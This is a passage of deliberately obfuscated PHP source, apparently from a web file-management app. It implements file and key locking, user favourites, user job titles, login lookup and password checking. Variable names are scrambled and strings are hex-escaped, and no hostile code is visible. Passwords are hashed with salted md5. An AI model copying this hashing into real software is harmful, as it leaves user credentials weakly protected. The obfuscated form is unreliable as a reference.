(!$‘Ê¨ä™©) { $ßéªİ¤ = "\x6c\x6f\x63\153\40\145\x72\162\x6f\162\x3b\153\x65\x79\x3d{$Í ûöš}\73\164\x69\x6d\145\x3d{$’±êƒê®}\x3b" . self::$errorMsg . $Õš¦û¨[74] . get_caller_msg(); $€Î‰´òğ = LNG($Õš¦û¨[994]) . "\x28{$’±êƒê®}\x73\x29\56" . LNG($Õš¦û¨[995]); $€Î‰´òğ .= $Õš¦û¨[996]; if (is_string(self::$errorMsg) && self::$errorMsg) { $€Î‰´òğ = $€Î‰´òğ . $Õš¦û¨[997] . self::$errorMsg; } write_log($Õš¦û¨[998] . sprintf($Õš¦û¨[999], timeFloat() - $„ñ‚¾Êô) . $Õš¦û¨[1000] . $ßéªİ¤ . $Õš¦û¨[1001] . json_encode(error_get_last()), $Õš¦û¨[991]); show_json($€Î‰´òğ, !1); } if (!$‰ºø•¸) { self::$lockItem[$»ÑÅŞÏ™] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $úÄš˜İÔ = number_format(timeFloat() - $Î—ÊÊ‡Á, 3); write_log($Õš¦û¨[1002] . $Í ûöš . $Õš¦û¨[1003] . $úÄš˜İÔ, $Õš¦û¨[991]); } return $‘Ê¨ä™©; } public static function lockGet($àüˆÅÍÉ) { $À©·¿¼ñ = self::key($àüˆÅÍÉ); if (self::$lockItem[$À©·¿¼ñ]) { return self::$lockItem[$À©·¿¼ñ]; } return self::init()->lockGet($À©·¿¼ñ); } public static function unlock($µÃ—«¸·) { $ºÉÎİÌ½ =& $_SERVER[¹Éµ„ºå]; $¢¥Ö±‡ = self::key($µÃ—«¸·); self::$lockItem[$¢¥Ö±‡] = null; self::init()->unlock($¢¥Ö±‡); if (GLOBAL_DEBUG_LOG_ALL) { write_log($ºÉÎİÌ½[1004] . $µÃ—«¸·, $ºÉÎİÌ½[991]); } return; } public static function unlockRuntime() { $ñîì‰ì® =& $_SERVER[¹Éµ„ºå]; $ªÅ“¾™œ = self::init(); $Ãôšó˜ = !1; foreach (self::$lockItem as $ôş–àõ‰ => $éàûüş) { if (!$éàûüş) { continue; } $ªÅ“¾™œ->unlock($ôş–àõ‰); if (!$Ãôšó˜) { $Ãôšó˜ = !0; write_log($ñîì‰ì®[1005] . $ôş–àõ‰ . $ñîì‰ì®[74] . get_caller_msg(), $ñîì‰ì®[991]); continue; } write_log($ñîì‰ì®[1005] . $ôş–àõ‰, $ñîì‰ì®[991]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $Ù’¹íıÁ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($ñîì‰ì®[1006] . $Ù’¹íıÁ . $ñîì‰ì®[1007] . ACTION, $ñîì‰ì®[991]); } } public static function fileLock($Ôƒ‚öŞç) { $¶øÁªĞï =& $_SERVER[¹Éµ„ºå]; if (!$GLOBALS[$¶øÁªĞï[1008]]) { $GLOBALS[$¶øÁªĞï[1008]] = array(); } $GLOBALS[$¶øÁªĞï[1008]][$Ôƒ‚öŞç] = !1; $¦ŠÕÒõ = fopen(DATA_PATH . $Ôƒ‚öŞç . $¶øÁªĞï[1009], $¶øÁªĞï[1010]); if (!$¦ŠÕÒõ) { return !1; } $GLOBALS[$¶øÁªĞï[1008]][$Ôƒ‚öŞç] = $¦ŠÕÒõ; if (flock($¦ŠÕÒõ, LOCK_EX)) { return !0; } self::unlock($Ôƒ‚öŞç); show_json($¶øÁªĞï[1011], !1); return !1; } public static function fileUnlock($Ñæ¡¤³) { $œñááÇ‘ =& $_SERVER[¹Éµ„ºå]; $ı©‹³ì‹ = $GLOBALS[$œñááÇ‘[1008]][$Ñæ¡¤³]; if (!$ı©‹³ì‹) { return; } $GLOBALS[$œñááÇ‘[1008]][$Ñæ¡¤³] = !1; flock($ı©‹³ì‹, LOCK_UN); fclose($ı©‹³ì‹); } public static function fileUnlockAll() { $ÖÖ÷ıô =& $_SERVER[¹Éµ„ºå]; if (!isset($GLOBALS[$ÖÖ÷ıô[1008]]) || !$GLOBALS[$ÖÖ÷ıô[1008]]) { return; } foreach ($GLOBALS[$ÖÖ÷ıô[1008]] as $ÌÆ»Ğºê => $Ğ½‡ƒ°Æ) { if (!$Ğ½‡ƒ°Æ) { continue; } $GLOBALS[$ÖÖ÷ıô[1008]][$ÌÆ»Ğºê] = !1; flock($Ğ½‡ƒ°Æ, LOCK_UN); fclose($Ğ½‡ƒ°Æ); } $GLOBALS[$ÖÖ÷ıô[1008]] = array(); } } goto Bß©Èâ¾Â; c˜¥Õ·«ªô: class UserFavModel extends ModelBase { protected $tableName = "\165\x73\x65\x72\x5f\x66\141\x76"; protected function cacheFunctionAlias($æí™•Û¿) { $Íí‹£§ƒ =& $_SERVER[¹Éµ„ºå]; return array($Íí‹£§ƒ[2285] => array(USER_ID, $Íí‹£§ƒ[2659])); } protected function ___listData() { $‹ÁÉğ˜ô =& $_SERVER[¹Éµ„ºå]; $¤Îí×İ… = array($‹ÁÉğ˜ô[1956] => USER_ID, $‹ÁÉğ˜ô[573] => 0); $û…‡¯„Š = $‹ÁÉğ˜ô[2660]; $âºİçËï = $this->field($û…‡¯„Š)->where($¤Îí×İ…)->order($‹ÁÉğ˜ô[2661])->select(); return $âºİçËï ? $âºİçËï : array(); } protected function resetCache() { } protected function listView() { $áı‹´€ =& $_SERVER[¹Éµ„ºå]; $áÌì¶€™ = $this->listData(); $µ¥Û‚Éñ = array_filter_by_field($áÌì¶€™, $áı‹´€[33], $áı‹´€[505]); $½ïìÓä£ = array_to_keyvalue($µ¥Û‚Éñ, $áı‹´€[12], $áı‹´€[87]); if (!$½ïìÓä£) { return $áÌì¶€™; } $× ìô–Ü = 2000; $ìÏ÷ûçÙ = array($áı‹´€[506] => array($áı‹´€[507], $½ïìÓä£)); $•üäè¤ = Model($áı‹´€[924])->listSource($ìÏ÷ûçÙ, $× ìô–Ü); $•üäè¤ = array_merge($•üäè¤[$áı‹´€[86]], $•üäè¤[$áı‹´€[85]]); $•üäè¤ = array_to_keyvalue($•üäè¤, $áı‹´€[191]); foreach ($áÌì¶€™ as $Ú’©†¡ => $±ƒúïÊµ) { $ÕŠü†Ø˜ = $•üäè¤[$±ƒúïÊµ[$áı‹´€[87]]]; $ÕŠü†Ø˜ = $ÕŠü†Ø˜ ? $ÕŠü†Ø˜ : array(); $áÌì¶€™[$Ú’©†¡] = array_merge($ÕŠü†Ø˜, $±ƒúïÊµ); } return $áÌì¶€™; } protected function addFav($Ÿ—ã¬ÁŸ, $ñõ´ÎÎ = '', $îÄÔßƒü = "\x73\x6f\165\x72\143\145") { $”ı¨µû­ =& $_SERVER[¹Éµ„ºå]; $ú¢ºÈºà = array($”ı¨µû­[1956] => USER_ID, $”ı¨µû­[573] => 0, $”ı¨µû­[511] => $îÄÔßƒü, $”ı¨µû­[510] => $Ÿ—ã¬ÁŸ); if ($this->where($ú¢ºÈºà)->find()) { return !1; } $ú¢ºÈºà = array($”ı¨µû­[1956] => USER_ID, $”ı¨µû­[573] => 0); $Ï­ä¥Íš = $this->where($ú¢ºÈºà)->max($”ı¨µû­[2193]); if (!$Ï­ä¥Íš) { $Ï­ä¥Íš = 0; } if (!$ñõ´ÎÎ && $îÄÔßƒü == $”ı¨µû­[505]) { $…“€Ï’ˆ = Model($”ı¨µû­[1523])->where(array($”ı¨µû­[506] => $Ÿ—ã¬ÁŸ))->find(); if (!$…“€Ï’ˆ) { return !1; } $ñõ´ÎÎ = $…“€Ï’ˆ[$”ı¨µû­[32]]; } $ñõ´ÎÎ = $this->getAutoName($ñõ´ÎÎ); $½ûüÖá… = array($”ı¨µû­[1956] => USER_ID, $”ı¨µû­[573] => 0, $”ı¨µû­[509] => $ñõ´ÎÎ, $”ı¨µû­[510] => $Ÿ—ã¬ÁŸ, $”ı¨µû­[511] => $îÄÔßƒü, $”ı¨µû­[2175] => $Ï­ä¥Íš + 1); return $this->add($½ûüÖá…); } protected function remove($£ËíŠò) { $Šåı¦Ë =& $_SERVER[¹Éµ„ºå]; $¨‡ÕÃ£¦ = array($Šåı¦Ë[1956] => USER_ID, $Šåı¦Ë[508] => $£ËíŠò); return $this->where($¨‡ÕÃ£¦)->delete(); } protected function removeByName($íìŞíÉä) { $ºšï¤ğ =& $_SERVER[¹Éµ„ºå]; $ìñĞ ¦” = array($ºšï¤ğ[1956] => USER_ID, $ºšï¤ğ[509] => $íìŞíÉä, $ºšï¤ğ[573] => 0); return $this->where($ìñĞ ¦”)->delete(); } protected function rename($™øù±˜ê, $¾ÑÇ±¬Ô) { $¹Ï‘Ì­ =& $_SERVER[¹Éµ„ºå]; if ($™øù±˜ê == $¾ÑÇ±¬Ô) { return !1; } $Åæ‚å¡Œ = $this->getAutoName($¾ÑÇ±¬Ô); if ($¾ÑÇ±¬Ô != $Åæ‚å¡Œ) { return !1; } $ó„¸¯áõ = array($¹Ï‘Ì­[1956] => USER_ID, $¹Ï‘Ì­[573] => 0, $¹Ï‘Ì­[32] => $™øù±˜ê); return $this->where($ó„¸¯áõ)->save(array($¹Ï‘Ì­[32] => $¾ÑÇ±¬Ô)); } protected function resetSort($ƒüúªŸß) { $ğ‚¾£Ãï =& $_SERVER[¹Éµ„ºå]; $ƒüúªŸß = is_array($ƒüúªŸß) ? $ƒüúªŸß : array(); $¥Ê“ÌÄ = array($ğ‚¾£Ãï[1956] => USER_ID); for ($ º¸ìê = 0; $ º¸ìê < count($ƒüúªŸß); $ º¸ìê++) { $¥Ê“ÌÄ[$ğ‚¾£Ãï[508]] = $ƒüúªŸß[$ º¸ìê]; $this->where($¥Ê“ÌÄ)->save(array($ğ‚¾£Ãï[2175] => $ º¸ìê + 1)); } return !0; } protected function moveTop($ØóóÏº) { $µ±ô„ÏŠ =& $_SERVER[¹Éµ„ºå]; $òó«İáÊ = array($µ±ô„ÏŠ[1956] => USER_ID, $µ±ô„ÏŠ[573] => 0); $˜ŒŸ°™ = $this->where($òó«İáÊ)->where(array($µ±ô„ÏŠ[32] => $ØóóÏº))->find(); if (!$˜ŒŸ°™) { return; } $ÀªˆÂûÄ = $this->field($µ±ô„ÏŠ[487])->where($òó«İáÊ)->order($µ±ô„ÏŠ[2661])->select(); $ÀªˆÂûÄ = array_to_keyvalue($ÀªˆÂûÄ, $µ±ô„ÏŠ[12], $µ±ô„ÏŠ[487]); $Î÷øÅæÔ = $ÀªˆÂûÄ; $ÀªˆÂûÄ = array_remove_value($ÀªˆÂûÄ, $˜ŒŸ°™[$µ±ô„ÏŠ[487]]); array_unshift($ÀªˆÂûÄ, $˜ŒŸ°™[$µ±ô„ÏŠ[487]]); return $this->resetSort($ÀªˆÂûÄ); } protected function moveBottom($ôîîßÌ³) { $ƒÌ°§çğ =& $_SERVER[¹Éµ„ºå]; $¥«òè¨ã = array($ƒÌ°§çğ[1956] => USER_ID, $ƒÌ°§çğ[573] => 0); $¬à„í³Ã = $this->where($¥«òè¨ã)->max($ƒÌ°§çğ[2193]); $òà“Ø§ = array($ƒÌ°§çğ[2193] => $¬à„í³Ã + 1); return $this->where($¥«òè¨ã)->where(array($ƒÌ°§çğ[32] => $ôîîßÌ³))->save($òà“Ø§); } private function getAutoName($é„Å¯ÓÉ) { $šĞÛšì =& $_SERVER[¹Éµ„ºå]; $®õÏÒÃ… = array($šĞÛšì[1956] => USER_ID, $šĞÛšì[573] => 0); $€ì¶ùÆÂ = $this->field($šĞÛšì[32])->where($®õÏÒÃ…)->select(); $€ì¶ùÆÂ = array_to_keyvalue($€ì¶ùÆÂ, $šĞÛšì[12], $šĞÛšì[32]); if (!$€ì¶ùÆÂ || !in_array($é„Å¯ÓÉ, $€ì¶ùÆÂ)) { return $é„Å¯ÓÉ; } for ($Ú÷ñ· = 0; $Ú÷ñ· < count($€ì¶ùÆÂ); $Ú÷ñ·++) { if (!in_array($é„Å¯ÓÉ . "\x28{$Ú÷ñ·}\51", $€ì¶ùÆÂ)) { return $é„Å¯ÓÉ . "\x28{$Ú÷ñ·}\51"; } } return $é„Å¯ÓÉ . "\50{$Ú÷ñ·}\51"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\155\x2e\152\x6f\142\x4c\x69\163\x74"; public $field = array("\x6e\x61\x6d\145", "\144\145\163\143", "\x73\x6f\162\x74"); const JOB_KEY = "\163\x65\154\146\112\157\x62\x4c\x69\x73\164"; public function listData($ŞÖİµ²³ = false, $ÍÜ®šÕ = "\x73\157\162\164", $ü×Ü¿Ô¾ = false) { return parent::listData($ŞÖİµ²³, $ÍÜ®šÕ, $ü×Ü¿Ô¾); } public function remove($­¥ÒÎ¬’) { return parent::remove($­¥ÒÎ¬’); } public function add($œôŠ€ı) { $Äì©«¼à =& $_SERVER[¹Éµ„ºå]; if ($this->findByName($œôŠ€ı[$Äì©«¼à[32]])) { return !1; } $œôŠ€ı[$Äì©«¼à[2193]] = $this->getSort(); return parent::insert($œôŠ€ı); } private function getSort() { $§éŠïÆ¼ =& $_SERVER[¹Éµ„ºå]; $Óµ®çÆ± = parent::listData(); $‚¢¡á¬ = array_to_keyvalue($Óµ®çÆ±, $§éŠïÆ¼[12], $§éŠïÆ¼[2193]); return empty($‚¢¡á¬) ? 0 : max($‚¢¡á¬) + 1; } public function update($È¬ĞÔòë, $×ëÀÒ’é) { $³´–¦Ş =& $_SERVER[¹Éµ„ºå]; $ú¹Ì›² = parent::listData($È¬ĞÔòë); $ñ–à¾õ = $this->findByName($×ëÀÒ’é[$³´–¦Ş[32]]); if (!$ú¹Ì›² || $ñ–à¾õ && $ñ–à¾õ[$³´–¦Ş[487]] != $ú¹Ì›²[$³´–¦Ş[487]]) { return !1; } return parent::update($È¬ĞÔòë, $×ëÀÒ’é); } public function setUserJob($“”¢¤Ë, $–í¶ÉÚ) { $¿ıŒÃ² =& $_SERVER[¹Éµ„ºå]; if (!is_array($–í¶ÉÚ)) { $–í¶ÉÚ = array($–í¶ÉÚ); } $‰§†š = parent::listData(); $¼ûÕßê½ = array_to_keyvalue($‰§†š, $¿ıŒÃ²[32]); $£Á­´¡– = $¿ıŒÃ²[463]; foreach ($–í¶ÉÚ as $à¾İñÙÑ) { if ($¼ûÕßê½[$à¾İñÙÑ]) { $£Á­´¡– .= $¼ûÕßê½[$à¾İñÙÑ][$¿ıŒÃ²[487]] . $¿ıŒÃ²[50]; } else { $ùŠ·¿œÀ = $this->add($à¾İñÙÑ); $£Á­´¡– .= $ùŠ·¿œÀ . $¿ıŒÃ²[50]; } } $£Á­´¡– = rtrim($£Á­´¡–, $¿ıŒÃ²[50]); Model($¿ıŒÃ²[617])->metaSet($“”¢¤Ë, self::JOB_KEY, $£Á­´¡–); } public function getUserJob($Î®àá²ã) { $®¶¥ ÏÉ = Model($_SERVER[¹Éµ„ºå][617])->metaGet($Î®àá²ã); return $this->getUserJobInfo($®¶¥ ÏÉ[self::JOB_KEY]); } public function getUserJobInfo($¦â—”ÔÌ) { $ªÛ´§µá =& $_SERVER[¹Éµ„ºå]; $ÛÃÄ¼¬µ = explode($ªÛ´§µá[50], $¦â—”ÔÌ); $—Ïè¶€› = parent::listData(); $—Ïè¶€› = array_remove_key($—Ïè¶€›, $ªÛ´§µá[231]); $Öî³¿Í° = array(); foreach ($ÛÃÄ¼¬µ as $Şó¡üıÄ) { if (isset($—Ïè¶€›[$Şó¡üıÄ])) { $Öî³¿Í°[] = $—Ïè¶€›[$Şó¡üıÄ]; } } return $Öî³¿Í°; } } class UserModel extends ModelBase { protected $tableName = "\x75\163\x65\162"; protected $tableMeta = array("\164\141\142\x6c\x65\x4e\x61\155\145" => "\165\x73\145\x72\x5f\x6d\x65\x74\x61", "\155\x65\164\141\106\151\x65\154\x64" => "\x75\163\x65\162\111\104"); protected $simpleField = "\x75\x73\145\x72\x49\104\54\x6e\x69\143\x6b\116\x61\155\145\54\x6e\x61\155\x65\x2c\x61\166\x61\164\x61\162\x2c\x73\x65\x78\54\163\164\x61\164\x75\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($Õ“¿ğÔ×) { $ìµíı¤ä =& $_SERVER[¹Éµ„ºå]; $óÕõëöü = $ìµíı¤ä[2662]; return array($ìµíı¤ä[2252] => array($Õ“¿ğÔ×[0], $óÕõëöü), $ìµíı¤ä[2254] => array($Õ“¿ğÔ×[0], $óÕõëöü), $ìµíı¤ä[2663] => array($Õ“¿ğÔ×[0], $óÕõëöü)); } protected function ___getInfo($éíÌÆí) { $´¶øÁ¶ = $this->getInfoSimple($éíÌÆí); if (!$´¶øÁ¶ || !is_array($´¶øÁ¶)) { return array(); } return $this->_getInfoApply($´¶øÁ¶); } protected function ___getInfoFull($¢÷ªÖË±) { $œ¾®­âœ = $this->getInfoSimple($¢÷ªÖË±); if (!$œ¾®­âœ || !is_array($œ¾®­âœ)) { return array(); } return $this->_getInfoApply($œ¾®­âœ, !0); } protected function ___getInfoSimple($»÷¸óÔ£) { $Åãöó»ñ =& $_SERVER[¹Éµ„ºå]; if (!$»÷¸óÔ£) { return array(); } $ä§ø¹âæ = $this->where(array($Åãöó»ñ[1582] => intval($»÷¸óÔ£)))->find(); if (!$ä§ø¹âæ || !is_array($ä§ø¹âæ)) { return array(); } $ä§ø¹âæ[$Åãöó»ñ[2363]] = Action($Åãöó»ñ[2364])->parseUrl($ä§ø¹âæ[$Åãöó»ñ[2363]]); return $ä§ø¹âæ; } private function _getInfoApply($Åİ½òÆ”, $ñ…ÜÏÏ = false) { $Ì¡‡û³š =& $_SERVER[¹Éµ„ºå]; if (!$Åİ½òÆ”) { return $Åİ½òÆ”; } $ÂÈùãÇƒ = md5($Ì¡‡û³š[2664] . $Åİ½òÆ”[$Ì¡‡û³š[1043]] . $Ì¡‡û³š[2665] . $Åİ½òÆ”[$Ì¡‡û³š[32]]); $Åİ½òÆ” = $this->_listDataApplyItem($Åİ½òÆ”); $‰‰”è¼‰ = Model($Ì¡‡û³š[1523])->metaGet($Åİ½òÆ”[$Ì¡‡û³š[90]][$Ì¡‡û³š[191]]); $Åİ½òÆ”[$Ì¡‡û³š[2666]] = $ÂÈùãÇƒ; $Åİ½òÆ”[$Ì¡‡û³š[90]][$Ì¡‡û³š[2453]] = isset($‰‰”è¼‰[$Ì¡‡û³š[2454]]) ? $‰‰”è¼‰[$Ì¡‡û³š[2454]] : null; if ($ñ…ÜÏÏ) { $Åİ½òÆ”[$Ì¡‡û³š[555]] = $this->metaGet($Åİ½òÆ”[$Ì¡‡û³š[1582]]); } return $Åİ½òÆ”; } protected function getInfoSimpleOuter($û–šºë) { $€Ö¨ÇÚ† =& $_SERVER[¹Éµ„ºå]; if (!$û–šºë || $û–šºë == 0) { return array($€Ö¨ÇÚ†[1582] => $€Ö¨ÇÚ†[228], $€Ö¨ÇÚ†[32] => $€Ö¨ÇÚ†[173] . LNG($€Ö¨ÇÚ†[2667]) . $€Ö¨ÇÚ†[175], $€Ö¨ÇÚ†[2363] => STATIC_PATH . $€Ö¨ÇÚ†[2668]); } $ï…Ú–ï = $this->cacheFunctionGet($€Ö¨ÇÚ†[2263], $û–šºë); $¬úš‚’ñ = array_field_key($ï…Ú–ï, explode($€Ö¨ÇÚ†[50], $this->simpleField)); if (!$¬úš‚’ñ) { return array($€Ö¨ÇÚ†[1582] => $€Ö¨ÇÚ†[1369], $€Ö¨ÇÚ†[32] => $€Ö¨ÇÚ†[173] . LNG($€Ö¨ÇÚ†[2669]) . $€Ö¨ÇÚ†[175], $€Ö¨ÇÚ†[2363] => STATIC_PATH . $€Ö¨ÇÚ†[2670]); } $¬úš‚’ñ[$€Ö¨ÇÚ†[2363]] = Action($€Ö¨ÇÚ†[2364])->parseUrl($¬úš‚’ñ[$€Ö¨ÇÚ†[2363]]); return $¬úš‚’ñ; } protected function groupUser($ÇÖÎÃó) { } public static function errorLang($ëàöü‘) { $°”³»œÚ =& $_SERVER[¹Éµ„ºå]; $Æ²äé¥ = array(self::ERROR_USER_NOT_EXISTS => $°”³»œÚ[2671], self::ERROR_USER_PASSWORD_ERROR => $°”³»œÚ[2672], self::ERROR_USER_EXIST_NAME => $°”³»œÚ[2673], self::ERROR_USER_EXIST_PHONE => $°”³»œÚ[2674], self::ERROR_USER_EXIST_EMAIL => $°”³»œÚ[2675], self::ERROR_USER_LOGIN_LOCK => $°”³»œÚ[2676], self::ERROR_IP_NOT_ALLOW => $°”³»œÚ[2677], self::ERROR_USER_EXIST_NICKNAME => $°”³»œÚ[2678]); $Ì¡«Àª¸ = LNG($Æ²äé¥[$ëàöü‘]); if ($ëàöü‘ == self::ERROR_USER_LOGIN_LOCK) { $Îá÷» = (int) Model($°”³»œÚ[1478])->get($°”³»œÚ[2679]); if ($Îá÷» > 60) { $Ì¡«Àª¸ = str_replace($°”³»œÚ[91], ceil($Îá÷» / 60), $Ì¡«Àª¸); } } return $Ì¡«Àª¸; } protected function metaSet($Ôú¯È²”, $‘öåı˜  = null, $­üğ¦Åì = null) { $this->clearCache($Ôú¯È²”); return parent::metaSet($Ôú¯È²”, $‘öåı˜ , $­üğ¦Åì); } public function getInfoByMeta($Ú–šòÅó, $·ú… ¬û) { $é—ÏéÍê =& $_SERVER[¹Éµ„ºå]; $±ş£šøá = Model($é—ÏéÍê[2680])->where(array($é—ÏéÍê[95] => $Ú–šòÅó, $é—ÏéÍê[451] => $·ú… ¬û))->find(); if ($±ş£šøá) { return $this->getInfo($±ş£šøá[$é—ÏéÍê[1582]]); } return !1; } public function userLoginCheck($®©©Œåê, $Ì˜×†, $Êùã‚Â = false) { $‚¤öëÉõ =& $_SERVER[¹Éµ„ºå]; $Ÿ¿Ò‚ˆï = $this->userLoginFind($®©©Œåê); if (!$Ÿ¿Ò‚ˆï) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($Ÿ¿Ò‚ˆï[$‚¤öëÉõ[1582]], $Ì˜×†)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $Êùã‚Â ? $this->getInfoFull($Ÿ¿Ò‚ˆï[$‚¤öëÉõ[1582]]) : $this->getInfo($Ÿ¿Ò‚ˆï[$‚¤öëÉõ[1582]]); } public function userLoginFind($«ó¦Ûé) { $ıšêü² =& $_SERVER[¹Éµ„ºå]; $Â«Á¡Á¡ = array($ıšêü²[32] => $«ó¦Ûé, $ıšêü²[2464] => $«ó¦Ûé, $ıšêü²[380] => $«ó¦Ûé, $ıšêü²[2681] => $«ó¦Ûé, $ıšêü²[1157] => $ıšêü²[1159]); if ($this->nickNameRpt()) { unset($Â«Á¡Á¡[$ıšêü²[2464]]); } return $this->where($Â«Á¡Á¡)->find(); } public function clearCache($Å ŸòËĞ) { $³ú¿µû– =& $_SERVER[¹Éµ„ºå]; $this->cacheFunctionClear($³ú¿µû–[2262], $Å ŸòËĞ); $this->cacheFunctionClear($³ú¿µû–[2263], $Å ŸòËĞ); $this->cacheFunctionClear($³ú¿µû–[2682], $Å ŸòËĞ); } public function userPasswordCheck($ä°§‘ƒĞ, $İàÂê‰©) { $šìœ‚ =& $_SERVER[¹Éµ„ºå]; $½Ì Ëâ = $this->where(array($šìœ‚[1582] => intval($ä°§‘ƒĞ)))->find(); $‚û‡¿™ = $this->metaGet($ä°§‘ƒĞ); $ß¾ÍÍÓˆ = isset($‚û‡¿™[$šìœ‚[2683]]) ? $‚û‡¿™[$šìœ‚[2683]] : $šìœ‚[12]; if (md5($ß¾ÍÍÓˆ . trim($İàÂê‰©)) !== $½Ì Ëâ[$šìœ‚[1043]]) { return !1; } return !0; } public function userAdd($½Î‡ÄĞĞ) { $Ë½µŞÊô =& $_SERVER[¹Éµ„ºå]; $¡ÏÕÏ» = array($Ë½µŞÊô[509] => $½Î‡ÄĞĞ[$Ë½µŞÊô[32]], $Ë½µŞÊô[2684] => $½Î‡ÄĞĞ[$Ë½µŞÊô[2362]], $Ë½µŞÊô[2685] => isset($½Î‡ÄĞĞ[$Ë½µŞÊô[380]]) ? $½Î‡ÄĞĞ[$Ë½µŞÊô[380]] : $Ë½µŞÊô[12], $Ë½µŞÊô[2686] => isset($½Î‡ÄĞĞ[$Ë½µŞÊô[2681]]) ? $½Î‡ÄĞĞ[$Ë½µŞÊô[2681]] : $Ë½µŞÊô[12], $Ë½µŞÊô[2687] => isset($½Î‡ÄĞĞ[$Ë½µŞÊô[2464]]) ? $½Î‡ÄĞĞ[$Ë½µŞÊô[2464]] : $½Î‡ÄĞĞ[$Ë½µŞÊô[32]], $Ë½µŞÊô[2688] => isset($½Î‡ÄĞĞ[$Ë½µŞÊô[2363]]) ? $½Î‡ÄĞĞ[$Ë½µŞÊô[2363]] : $Ë½µŞÊô[12], $Ë½µŞÊô[2689] => isset($½Î‡ÄĞĞ[$Ë½µŞÊô[2690]]) ? $½Î‡ÄĞĞ[$Ë½µŞÊô[2690]] : 1, $Ë½µŞÊô[2691] => $½Î‡ÄĞĞ[$Ë½µŞÊô[1043]], $Ë½µŞÊô[2256] => isset($½Î‡ÄĞĞ[$Ë½µŞÊô[2156]]) ? $½Î‡ÄĞĞ[$Ë½µŞÊô[2156]] : 1024 * 1024 * 20, $Ë½µŞÊô[2257] => 0, $Ë½µŞÊô[2692] => 0, $Ë½µŞÊô[2302] => isset($½Î‡ÄĞĞ[$Ë½µŞÊô[841]]) ? $½Î‡ÄĞĞ[$Ë½µŞÊô[841]] : 1); if (!empty($½Î‡ÄĞĞ[$Ë½µŞÊô[1582]])) { $¡ÏÕÏ»[$Ë½µŞÊô[1582]] = $½Î‡ÄĞĞ[$Ë½µŞÊô[1582]]; } $¶´ëú±Õ = $this->_checkExist($½Î‡ÄĞĞ); if ($¶´ëú±Õ !== !0) { return $¶´ëú±Õ; } if (!empty($¡ÏÕÏ»[$Ë½µŞÊô[2363]]) && strlen($¡ÏÕÏ»[$Ë½µŞÊô[2363]]) > 255) { $¡ÏÕÏ»[$Ë½µŞÊô[2363]] = $Ë½µŞÊô[12]; } $şê©Ş“ = $this->add($¡ÏÕÏ»); $¬üå§Õ = array($Ë½µŞÊô[2691] => $¡ÏÕÏ»[$Ë½µŞÊô[1043]], $Ë½µŞÊô[2687] => $¡ÏÕÏ»[$Ë½µŞÊô[2464]], $Ë½µŞÊô[2693] => $½Î‡ÄĞĞ[$Ë½µŞÊô[2261]]); $this->userEdit($şê©Ş“, $¬üå§Õ); Model($Ë½µŞÊô[1523])->userRootAdd($şê©Ş“); return $şê©Ş“; } protected function userEditTest($ª‘â±ú, $åûÓÁñû) { return $this->call($_SERVER[¹Éµ„ºå][2694], $ª‘â±ú, $åûÓÁñû); } protected function userEdit($ŠÒšÒïæ, $”§”Ó©¿) { $¢›‡Ö =& $_SERVER[¹Éµ„ºå]; $Œ¨Êøùò = $this->getInfoSimple($ŠÒšÒïæ); if (!$Œ¨Êøùò) { return !1; } $ ôß›Å» = $this->_checkExist($”§”Ó©¿, $ŠÒšÒïæ); if ($ ôß›Å» !== !0) { return $ ôß›Å»; } if (isset($”§”Ó©¿[$¢›‡Ö[1043]]) && trim($”§”Ó©¿[$¢›‡Ö[1043]]) != $¢›‡Ö[12]) { $«Ä›¡† = $this->metaGet($ŠÒšÒïæ); if (empty($«Ä›¡†[$¢›‡Ö[2683]])) { $«Ä›¡†[$¢›‡Ö[2683]] = rand_string(10); Model($¢›‡Ö[597])->metaSet($ŠÒšÒïæ, $¢›‡Ö[2683], $«Ä›¡†[$¢›‡Ö[2683]]); } $”§”Ó©¿[$¢›‡Ö[1043]] = md5($«Ä›¡†[$¢›‡Ö[2683]] . trim($”§”Ó©¿[$¢›‡Ö[1043]])); } else { unset($”§”Ó©¿[$¢›‡Ö[1043]]); } if (!empty($”§”Ó©¿[$¢›‡Ö[2363]]) && strlen($”§”Ó©¿[$¢›‡Ö[2363]]) > 255) { $”§”Ó©¿[$¢›‡Ö[2363]] = $¢›‡Ö[12]; } if (isset($”§”Ó©¿[$¢›‡Ö[2464]])) { $this->setNamePinyin($ŠÒšÒïæ, $”§”Ó©¿[$¢›‡Ö[2464]]); } if (isset($”§”Ó©¿[$¢›‡Ö[2261]])) { $ÆÒ•È¡¾ = $¢›‡Ö[1481] . $ŠÒšÒïæ; $ÈØ¶÷³… = $¢›‡Ö[1479]; $ıÅ²ä€ = $”§”Ó©¿[$¢›‡Ö[2261]] ? $”§”Ó©¿[$¢›‡Ö[2261]] : $¢›‡Ö[12]; $—·ÃÑØä = Model($¢›‡Ö[1478])->get($ÆÒ•È¡¾, $ÈØ¶÷³…); $—·ÃÑØä = $—·ÃÑØä ? $—·ÃÑØä : $¢›‡Ö[12]; if ($—·ÃÑØä != $ıÅ²ä€) { if (!$ıÅ²ä€ && $—·ÃÑØä) { Model($¢›‡Ö[1478])->remove($ÆÒ•È¡¾, $ÈØ¶÷³…); } else { if ($ıÅ²ä€) { Model($¢›‡Ö[1478])->set($ÆÒ•È¡¾, $ıÅ²ä€, $ÈØ¶÷³…); } } } unset($”§”Ó©¿[$¢›‡Ö[2261]]); Model($¢›‡Ö[617])->metaSet($ŠÒšÒïæ, $¢›‡Ö[2261], $ıÅ²ä€); } if (empty($”§”Ó©¿)) { return !0; } $this->where(array($¢›‡Ö[1956] => $ŠÒšÒïæ))->save($”§”Ó©¿); $this->clearCache($ŠÒšÒïæ); return !0; } public function setNamePinyin($¿¾Şˆ«Ò, $¯ü¤úñ¾ = false) { $åãÖÈ†Å =& $_SERVER[¹Éµ„ºå]; if (!$¯ü¤úñ¾) { $Ñø³ò = 